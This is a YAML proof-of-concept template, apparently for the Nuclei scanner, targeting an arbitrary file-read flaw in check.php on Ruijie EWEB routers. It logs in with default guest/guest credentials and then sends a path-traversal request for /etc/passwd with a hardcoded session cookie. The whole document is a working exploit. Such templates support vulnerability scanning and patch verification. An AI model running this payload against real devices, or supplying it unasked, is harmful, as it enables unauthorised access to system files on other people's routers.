id: poc-qfw91k8io59mmlkf
info:
  name: 锐捷EWEB路由器 check.php存在任意文件读取漏洞
  author: hacktwo
  severity: high
  description: ''
  tags: lfi,2025
http:
- raw:
  - 'POST /ddi/server/login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username=guest&password=guest?


    利用可用cookie访问接口'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /check.php?a=index&url=../../../../../etc/passwd HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36

    Cookie: RUIJIEID=ukdd3427at8dfl0ku8h9rq40n3;'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
